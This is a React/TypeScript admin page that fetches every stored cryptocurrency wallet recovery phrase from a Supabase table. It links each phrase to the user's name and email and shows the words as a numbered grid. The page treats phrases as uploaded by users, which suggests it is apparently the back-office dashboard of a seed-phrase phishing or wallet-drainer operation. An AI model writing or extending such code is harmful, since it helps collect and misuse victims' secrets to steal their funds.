import { useEffect, useState } from "react";
import { supabase as supabaseTyped } from "@/lib/supabaseClient";
const supabase: any = supabaseTyped;
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { toast } from "sonner";
import { KeyRound } from "lucide-react";

export default function PhrasesList() {
  const [rows, setRows] = useState<any[]>([]);
  const [profileMap, setProfileMap] = useState<Record<string, any>>({});
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    document.title = "Admin · Wallet Phrases";

    const fetchData = async () => {
      try {
        // 1. Fetch all wallet phrases
        const { data: phrases, error: phrasesError } = await supabase
          .from("wallet_phrases")
          .select("*")
          .order("created_at", { ascending: false });

        if (phrasesError) throw new Error(phrasesError.message);

        // 2. Gather unique user_ids
        const userIds = [...new Set(phrases.map((p: any) => p.user_id).filter(Boolean))];

        // 3. Fetch profiles using 'user_id' as the identifier column
        if (userIds.length > 0) {
          const { data: profiles, error: profilesError } = await supabase
            .from("profiles")
            .select("user_id, full_name, email")
            .in("user_id", userIds);

          if (profilesError) throw new Error(profilesError.message);

          // Build a lookup map: user_id -> profile
          const map: Record<string, any> = {};
          profiles.forEach((profile: any) => {
            map[profile.user_id] = profile;
          });
          setProfileMap(map);
        }

        setRows(phrases || []);
      } catch (err: any) {
        toast.error(err.message);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  return (
    <div className="space-y-4">
      <div>
        <h1 className="text-2xl font-semibold">Wallet Phrases</h1>
        <p className="text-sm text-muted-foreground">{rows.length} phrases · contains highly sensitive data</p>
      </div>

      {loading && <p className="text-muted-foreground">Loading…</p>}
      {!loading && rows.length === 0 && <p className="text-muted-foreground">No phrases uploaded</p>}

      <div className="grid gap-4 md:grid-cols-2">
        {rows.map((p) => {
          const words = (p.phrase || "").trim().split(/\s+/);
          const profile = profileMap[p.user_id] || {};

          return (
            <Card key={p.id}>
              <CardHeader className="pb-2">
                <CardTitle className="flex items-center gap-2 text-base">
                  <KeyRound className="h-4 w-4" />
                  {p.wallet_name || "Wallet"}
                </CardTitle>
                <p className="text-xs text-muted-foreground">
                  {profile?.full_name || profile?.email || p.user_id || "—"} ·{" "}
                  {new Date(p.created_at).toLocaleDateString()}
                </p>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-3 gap-2 font-mono text-sm">
                  {words.map((w: string, i: number) => (
                    <div key={i} className="rounded border border-border bg-muted/30 px-2 py-1">
                      <span className="mr-1 text-xs text-muted-foreground">{i + 1}.</span>
                      {w}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          );
        })}
      </div>
    </div>
  );
}
